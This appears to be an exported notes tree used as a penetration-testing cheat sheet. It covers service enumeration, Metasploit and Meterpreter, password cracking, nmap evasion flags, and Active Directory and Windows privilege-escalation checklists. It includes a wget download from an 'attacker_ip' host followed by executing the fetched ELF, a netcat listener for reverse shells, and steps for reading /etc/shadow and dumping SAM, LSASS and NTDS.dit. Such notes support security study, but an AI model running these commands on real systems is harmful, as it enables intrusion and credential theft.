    <node unique_id="289" master_id="0" name="DNS" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510746" ts_lastsave="1794513921">
      <node unique_id="290" master_id="0" name="Record Types" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794511564" ts_lastsave="1794511577">
        <rich_text>A  | Find IPv4 addresses
AAAA | Find IPv6 addresses
TXT | Find text records (api keys, tokens or flags)
MX | Find mail servers
CNAME | Find aliases to the IP (A records)
NS | Find the name server of the domain
any | everything from above (I suggest not using this, many dns servers block it) 

Zone Transfer
axfr | used to find private A and CNAME records linked to the NS domain (internal records)</rich_text>
      </node>
      <node unique_id="3" master_id="0" name="nslookup" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794511620">
        <rich_text>nslookup (Name Server Lookup)
		nslookup (FLAGS) {DOMAIN}
		FLAGS
			-type=PTR {IP} | reverse DNS lookup
</rich_text>
      </node>
      <node unique_id="7" master_id="0" name="dig (DNS Lookup)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794511646">
        <rich_text>dig (DNS Lookup)
		dig (RECORD) {domain.com} @{IP}</rich_text>
      </node>
      <node unique_id="20" master_id="0" name="dnsenum (DNS subdomains enumeration)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512039">
        <rich_text>dnsenum (DNS subdomains enumeration)
		dnsenum -f {WORDLIST} --dnsserver {DNS_SERVER} {subdomain}.domain.com
		FLAGS
			-f | sets the wordlist for subdomains enum
			-o | output file
			-p | set Threads
			-r | recursive, further enumerate the found subdomain
</rich_text>
      </node>
    </node>
    <node unique_id="291" master_id="0" name="IMAP, POP3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794512071" ts_lastsave="1794512097">
      <node unique_id="27" master_id="0" name="openssl (imap,pop3 connection)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512102">
        <rich_text>openssl (imap,pop3 connection)
		openssl s_client -connect {IP}:IMAPS or pop3s</rich_text>
      </node>
    </node>
    <node unique_id="292" master_id="0" name="SNMP" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794512138" ts_lastsave="1794512138">
      <node unique_id="29" master_id="0" name="snmpwalk" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512147">
        <rich_text>snmpwalk
		snmpwalk (FLAGS) -c {community_string} {IP}
		FLAGS
			-v 1|2c|3 	| sets version of snmp
			-u user 	| username for v3
			-a MD5|SHA	| Authentication Protocol for v3
			-A {authphrase} | Authentication passphrase for v3
</rich_text>
      </node>
      <node unique_id="36" master_id="0" name="onesixtyone (Community Strings SNMP)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512158">
        <rich_text>onesixtyone (Community Strings SNMP)
		onesixtyone -c {Wordlist} {IP}
		if a string is found, it will be in brackets like [public]</rich_text>
      </node>
    </node>
    <node unique_id="293" master_id="0" name="RPC" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794512187" ts_lastsave="1794512187">
      <node unique_id="39" master_id="0" name="RPCclient (MSRPC Administration tool)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512225">
        <rich_text>RPCclient (MSRPC Administration tool)
		rpcclient (FLAGS) {IP}
			-U "domain/username%password"| to log in as a user (can leave blank if share isn't secured)

		AFTER CONNECTING
			srvinfo | display Server information
			enumdomains | enumerate all domains in the network
			querydominfo | provides domain, server and user information of deployed domains
			netshareenumall | enumerate all available shares
			netsharegetinfo &lt;share&gt; | provides info about a specific share
			enumdomusers | enum all domain users
			queryuser &lt;RID&gt; | provides info about a specific user
</rich_text>
      </node>
    </node>
    <node unique_id="294" master_id="0" name="SMB (Folder/File sharing)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794512253" ts_lastsave="1794512378">
      <node unique_id="50" master_id="0" name="SMBclient (SMB)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512255">
        <rich_text>SMBclient (SMB)
		smbclient //{ip_address}/{SHARE} (FLAGS)
		FLAGS
			-N | null session, this lets you anonymously connect to a target's SMB share.
			-L | lists all the server's shares
			-U USER | Authenticate as user
		
		after connecting
			!&lt;cmd&gt; to execute local system commands
			help | to get all the commands you can run</rich_text>
      </node>
      <node unique_id="59" master_id="0" name="mount (NFS, mounts)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512317">
        <rich_text>mount (NFS, mounts)
		showmount (FLAGS) {IP}
		FLAGS
			-e | list all shares
			-a | show client names and mounted directories
			-d | show only directories the user uses
			-v | verbose output (version grabbing)
	
		mkdir target_nfs
		
		sudo mount -t nfs -o nolock {IP}:/share ./target_nfs
		FLAGS
			-t nfs | mount as NFS
			-o nolock | disables file locking
</rich_text>
      </node>
    </node>
    <node unique_id="295" master_id="0" name="Exploits" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794512396" ts_lastsave="1794512396">
      <node unique_id="71" master_id="0" name="Reverse Shells / File Transfer" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512413">
        <rich_text>Reverse Shells / File Transfer
		python3 -m http.server 9000
			wget </rich_text>
        <rich_text link="webs http://attacker_ip:9000/file_path">http://attacker_ip:9000/file_path</rich_text>
        <rich_text> to download file to remote pc

		Execute ELF:
			chmod +x {FILE}
			./path_to_file to run the .elf file
</rich_text>
      </node>
      <node unique_id="77" master_id="0" name="Msfvenom" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512435">
        <rich_text>Msfvenom
		msfvenom (FLAGS)
		FLAGS
			-l payloads/encoders 	| lists all payloads/encoders
			-p {payload} 		| specifies payload to use
			-f 			| specifies format of the payload
			-e 			| encodes the payload to avoid IDS and obsfucates
			-o 			| outputs to file
</rich_text>
      </node>
      <node unique_id="85" master_id="0" name="Metasploit" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512460">
        <rich_text>Metasploit
		msfconsole to enter
		use {MODULE} 		| to enter exploit module
		show options 		| to show all parameters available to be set
		set {parameter} {value} | sets parameter in the exploit youre in. Resets upon leaving. (can also set files as values from host pc)
			setg		| to set parameters for all other modules if using the same parameter.
			unset all/payload
			unsetg xyz

		info {exploit} 		| detailed informations about exploit
		exploit/run 		| run the exploit
			-z 		| run it in the background
			ctrl z / "background" in meterpreter

		sessions to show background connections
			-i {x-z} to select the session
			-k {id} to kill or leave id to kill all
			
		back 			| exit exploit
 		search (FLAG)
		FLAGS
			type:value (exploit, payload, auxiliary, encoder, evasion, post, nop)
			name:value
			platform:value (windows, linux etc...)
			cve:CVE-XXXX-XXXX
</rich_text>
      </node>
      <node unique_id="107" master_id="0" name="Meterpreter" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512522">
        <rich_text>Meterpreter
		help			| lists all the commands
		guid 			| gets the GUID of the session
		search -f {file_string} | used to find files
		hashdump 		| dumps all the hashes in the SAM
		getuid 			| display user privileges and rights
		ps 			| to display all processes.
		migrate {process_id} 	| to migrate to a process (useful for keystroke scan on certain apps like Excel, Word etc...)
		use "xyz" when refering to paths</rich_text>
      </node>
      <node unique_id="296" master_id="0" name="Bruteforce" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794512621" ts_lastsave="1794512625">
        <node unique_id="116" master_id="0" name="Hydra" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512623">
          <rich_text>Hydra
		hydra (FLAGS) {IP} 
		FLAGS
			-l &lt;username&gt; sets the user for login
			-P &lt;/Wordlist/path&gt; to set the password wordlist
			-t xzy sets the threads to spawn
		service
			ssh to set SSH login

		Web Forms
			sudo hydra -l -p {IP} http-post-form "loginURL:username=^USER^&amp;password=^PASS^:F=incorrect"</rich_text>
        </node>
        <node unique_id="126" master_id="0" name="John The Ripper" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512637">
          <rich_text>John The Ripper
		unshadow /etc/passwd /etc/shadow &gt; unshadowed.txt
			passwd 		| clear readable general user data
			shadow 		| is where password hashes are stored, needs admin privs.

		john (FLAGS) (file to crack path)
		FLAGS
			--wordlist={WORDLIST}
			--format={HASH_FORMAT} 
				--list=formats to find out what formats john supports
			--single single cracking mode

		CONVERSION TOOLS
		zip2john file.zip &gt; hash.txt
		rar2john file.rar &gt; hash.txt
		ssh2john id_rsa   &gt; hash.txt
</rich_text>
        </node>
        <node unique_id="140" master_id="0" name="Hashcat" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512682">
          <rich_text>Hashcat
		hashcat -m {MODE} -a {ATTACK} {HASHFILE} {WORDLIST}
		FLAGS
			-m specifies the hashtype in numeric format, e.g -m 1000 is NTLM. use man hashcat for more codes.
			-a specifies the attackmode, -a 0 = 1 password after the other from the wordlist
		EXAMPLE
			hashcat -m 1000 -a 0 hashes.txt rockyou.txt
</rich_text>
          <node unique_id="147" master_id="0" name="Hashes" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512737">
            <rich_text>md5sum {file}
		sha1sum
		sha256sum
		sha512sum
			outputs the hash as a hexadecimal
		
		generally passwords are saved as hashes not as cleartext. The password entered gets converted to a hash and 	compared to the hash saved. Hashes are very hard to reverse engineer so its way safer than just storing cleartext passwords.
		You can salt hashes by adding a string to the original cleartext before it gets hashed which changes the hash drastically
		Linux stores these password hashes in /etc/shadow only readable by root. Line contains 9 fields seperated by :
		Password fields are saved in this format $prefix$options$salt$hash
		prefix determines the encryption hashing scheme
</rich_text>
          </node>
        </node>
      </node>
    </node>
    <node unique_id="297" master_id="0" name="Network" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794512778" ts_lastsave="1794512778">
      <node unique_id="157" master_id="0" name="Netcat, ncat (Banner grabbing / Reverse bind shells)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794513555">
        <rich_text>Netcat, ncat (Banner grabbing / Reverse bind shells)
		nc (FLAGS) {IP} {PORT}
		FLAGS
			-l | Listening mode for incoming connections
			-z | Port scanning
			-u | uses UDP
			-v | verbose mode
			-n | don't resolve IP addresses

		EXAMPLE
			nc -lnvp 4444
</rich_text>
      </node>
      <node unique_id="194" master_id="0" name="NMap" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512945">
        <rich_text>NMap
		nmap (IP)/24 (FLAGS) (SCRIPTS)
		FLAGS
			-sn 				| ping scan host (no ports, only active hosts)
			-sL 				| List Target IPs/names
			-sT 				| TCP connect, complete Handshake
			-sS 				| stealth scan, only 1st step of Handshake
			-sU 				| UDP scan
			-F 				| scans only 100 most common ports (instead of 1000)
			-pX-Y 				| scans ports from x to y. -p- scans EVERY port.
			-O 				| OS detection (isn't always reliable)
			-sV 				| Service Version scan
			-A 				| O &amp; sV together plus other things
			-Pn 				| treat every Host as online and force scan.
			-v 				| verbosity level (-v or -vv)
			-oN {FILENAME} 			| saves as normal output
			-oG 				| GREPable output
			-D RND:xyz 			| to set up decoy IP adresses. Your IP will be put in that pool of 							  random IP Adresses. Combine it with a proxy.

			--disable-arp-ping 		| to disable arp pinging. This is better at evading EDRs as it 								  forces a L3 ping and does not come across as a high frequency 							  ping sweep/tcp request

			--source-port xyz 		| to force nmap to send traffic from the chosen port
			--data-length xyz 		| adds a random extra data to the packet frame so they do not look 							  like standard nmap probes (some EDRs look into it)
		TIMINGS
			-T0 paranoid 9.8h for 100 most common ports (5 min between each port)
			-T1 sneaky 27.53 min for 100p (15 sec between every 2 ports)
			-T2 polite 40.56 sec for 100p (0.4 sec for every port)
			-T3 normal 0.15 sec for 100p
			-T4 aggressive 0.13 sec for 100p
		SCRIPTS (categories)
			Needs to always start with --script xyz
			auth 				| Determination of authentication credentials.
			brute 				| Executes scripts that try to log in to the respective service by 							  brute-forcing with credentials.
			discovery 			| Evaluation of accessible services.
			exploit 			| This category of scripts tries to exploit known vulnerabilities 							  for the scanned port.

			version 			| Extension for service detection.
			vuln 				| Identification of specific vulnerabilities.
</rich_text>
      </node>
      <node unique_id="241" master_id="0" name="Telnet" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512990">
        <rich_text>Telnet
		Telnet (ip) (port)
		GET /{file} HTTP/1.1
		Host: xyz (optional)
</rich_text>
      </node>
      <node unique_id="245" master_id="0" name="TCPDump" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794513004">
        <rich_text>TCPDump
		ip a s
		sudo tcpdump (FILTERS) (FLAGS)
		FILTERS
			host {IP}				| Limit TO &amp; FROM {IP} host
			port {PORT} 				| Limit TO &amp; FROM {PORT} port
			src xyz host/port 			| Limit FROM xyz host/port
			dst xyz host/port			| Limit TO xyz host/port
			Protocol IP, IP6, UDP, TCP, ICMP or ARP | Limits the search for this protocol
	
			and 					| Captures packets where both conditions are true
			or 					| Captures packets when one conditions is true
			not 					| Captures packets when the condition is not true
		FLAGS
			-i eth interface
			-w save to file
			-r read from file
			-c Limit sniffs to certain count
			-n dont resolve ip -nn dont resolve protocols
			-v -vv -vvv verbosity</rich_text>
      </node>
    </node>
    <node unique_id="298" master_id="0" name="Web" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794512845" ts_lastsave="1794512845">
      <node unique_id="167" master_id="0" name="Whatweb" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512913">
        <rich_text>Whatweb
		whatweb {IP}
			to find out what kind of server a website uses if nc banner grabbing doesn't work
</rich_text>
      </node>
      <node unique_id="170" master_id="0" name="Gobuster" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794512923">
        <rich_text>Gobuster
		gobuster (FLAGS)
		FLAGS
			--help
			dir to use directory/file enumeration mode
				-u {URL} 			| to set the target
				-w {WORDLIST}			| to set the wordlist
				-t 				| to set the threads used
				-r 				| to redirect you to moved urls
				-x .extension 			| to find files with these extensions
				-o {File} 			| to output the results into a file

			dns to use subdomain enumeration
				-c 				| show CNAME records (can't use with -i flag)
				-i 				| shows ip addresses that the domain and subdomain resolve
				-d 				| for the domain you want to enumerate

			vhost to brute force virtual hosts (different websites hosted on the same host)
				-u {URL} 			| to set the target
				--domain {2nd &amp; 3rd lvl Domain} | to set the domain if set with IP
				--append-domain 		| to add the set domain to every entry to not get false 								  positives
				--exclude-length x-y 		| to ignore certain status codes that don't interest us
				-m 				| to set the http method (GET, POST)
				-r 				| follow redirects
		EXAMPLE
			gobuster dir -u inlanefreight.htb -w rockyou.txt -r
</rich_text>
      </node>
    </node>
    <node unique_id="264" master_id="0" name="MySQL" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794513021">
      <rich_text>MySQL
		mysql (FLAGS) {IP}
		FLAGS
			-u &lt;user&gt;
			-p&lt;password&gt; | no space inbetween "-p" flag and password!
			-h {IP}
</rich_text>
    </node>
  </node>
  <node unique_id="277" master_id="0" name="WINDOWS" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794513743">
    <node unique_id="299" master_id="0" name="Active Directory Procedures" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794513156" ts_lastsave="1794513661">
      <rich_text scale="h1">Active Directory Compromise</rich_text>
      <rich_text>

 
</rich_text>
      <rich_text scale="h2">Live Host Enumeration     </rich_text>
      <rich_text>
◇  Conduct a ping sweep on the IP range
◇  Use NetExec on the IP range (better information)
◇  Use Responder to catch IP addresses

  Note
      Be sure to properly understand the role of each host. Do your service enumeration.


</rich_text>
      <rich_text scale="h2">User Enumeration     </rich_text>
      <rich_text>
</rich_text>
      <rich_text weight="heavy">With foothold</rich_text>
      <rich_text>
◇  Get user list via SMB

</rich_text>
      <rich_text weight="heavy">Without foothold</rich_text>
      <rich_text>
◇  Attempt to get user list via SMB Null Authentication
◇  Attempt to get user list via LDAP Anonymous Bind
◇  Attempt to get user list via RPCClient
◇  Attempt to get user list via RID brute-forcing
◇  Attempt to get user list via Kerbruting

  Warning
      Some of these techniques are not guaranteed to discover all users. At least try the SMB, LDAP, RPCClient and RID methods.


</rich_text>
      <rich_text scale="h2">Get Foothold     </rich_text>
      <rich_text>
◇  Find Kerberoastable users from the user list
◇  Find ASREProastable users from the user list
◇  Use Responder to catch credential hashes
◇  Try SMB Null Authentication to spider through SMB shares looking for credentials
◇  Get </rich_text>
      <rich_text family="monospace">SYSTEM</rich_text>
      <rich_text> / </rich_text>
      <rich_text family="monospace">root</rich_text>
      <rich_text> on Domain connected host to get a Computer account
◇  As a last resource, try password spraying with the user list

  Caution
      Password spraying can lock accounts due to repeated failed attempts and should be used cautiously.


</rich_text>
      <rich_text scale="h2">Attacks     </rich_text>
      <rich_text>
◇  Use SharpHound to collect data to feed BloodHound
◇  Check compromised hosts on BloodHound for outbound attack paths
◇  Use NetExec to check for command execution via SMB, WinRM, and RDP for each compromised user.
◇  Kerberoast
◇  ASREProast
◇ Kerberos Delegation Attacks
      → Unconstrained Delegation
      →  Constrained Delegation
      →  Resource-Based Constrained Delegation

◇  Misconfigured certificate service
◇  Look for credentials in GPOs (</rich_text>
      <rich_text family="monospace">gpp_password</rich_text>
      <rich_text>, </rich_text>
      <rich_text family="monospace">autologin</rich_text>
      <rich_text>)
◇  For each compromised user, spider through readable SMB shares for sensitive information
◇  For each compromised user, conduct SMB Hash Theft attacks on writable SMB shares
◇  Look for passwords in user’s description fields
◇  Check the DC’s SYSVOL SMB share for scripts containing credentials
◇  </rich_text>
      <rich_text link="webs https://github.com/cube0x0/CVE-2021-1675">NoPac</rich_text>
      <rich_text>
◇  </rich_text>
      <rich_text link="webs https://github.com/m8sec/CVE-2021-34527">PrintNightmare</rich_text>
      <rich_text>
◇  </rich_text>
      <rich_text link="webs https://github.com/topotam/PetitPotam">PetitPotam</rich_text>
      <rich_text>
◇  Try compromised local administrator hashes on other hosts
◇  Try Responder on different hosts
◇  Look for users with the </rich_text>
      <rich_text family="monospace">PASSWD_NOTREQD</rich_text>
      <rich_text> field
◇  Password spray using previously found passwords

        
      
    
          </rich_text>
    </node>
    <node unique_id="301" master_id="0" name="Windows Enumeration &amp; Privilege Escalation" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794513743" ts_lastsave="1794513904">
      <rich_text scale="h1">Windows Enumeration &amp; Privilege Escalation</rich_text>
      <rich_text>

</rich_text>
      <rich_text scale="h2">Enumeration </rich_text>
      <rich_text>
• Enumerate users and groups
      → List local users
      →  List local groups
      →  Check membership of interesting groups▪  Local Administrator
         ⇒  Remote Desktop Users (RDP access)
         ⇒  Remote Management Users (WinRM access)


• Enumerate operating system information
     →  Windows version and </rich_text>
      <rich_text link="webs https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions">build number</rich_text>
      <rich_text>
     →  Architecture (32 or 64 bit)


• Enumerate network information
     →  IP addresses and network interfaces
     →  List active connections and listening ports


• Enumerate program and processes information
     →  List all installed applications and services
     →  Look at processes for any running applications that are not installed

•  Enumerate security features


</rich_text>
      <rich_text scale="h2">Privilege Escalation </rich_text>
      <rich_text>

</rich_text>
      <rich_text scale="h3">Global </rich_text>
      <rich_text>
◇  Try </rich_text>
      <rich_text link="webs https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS">WinPEAS</rich_text>
      <rich_text>
◇ Look for vulnerable services▪  Services with weak executable permissions
     →  Services where we can alter the executable path
     →  Unquoted service paths
     →  Services prone to DLL hijacking
		
◇  Check if </rich_text>
      <rich_text family="monospace">AlwaysInstallElevated</rich_text>
      <rich_text> is enabled.
◇  Search for CVEs in installed programs.
◇  See if there are known exploits for the Windows version.


</rich_text>
      <rich_text scale="h3">Per User </rich_text>
      <rich_text>
◇  Check user’s privileges
◇  Check which groups user belongs to
◇  Look for secrets in shell environment variables
◇  Hunt for credentials
◇  Look for Unquoted Service Paths
◇  Look for exploitable Scheduled Tasks
◇  Try planting malicious SCF and LINK files on writeable SMB shares.


</rich_text>
      <rich_text scale="h3">After Administrator </rich_text>
      <rich_text>
◇ Dump secrets▪  Get credentials using LaZagne
     →  Dump SAM &amp; LSA
     →  Dump LSASS memory
     →  Dump </rich_text>
      <rich_text family="monospace">NTDS.dit</rich_text>
      <rich_text> (if Domain Controller)



</rich_text>
    </node>
    <node unique_id="278" master_id="0" name="PowerShell" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1794510692" ts_lastsave="1794510692"/>
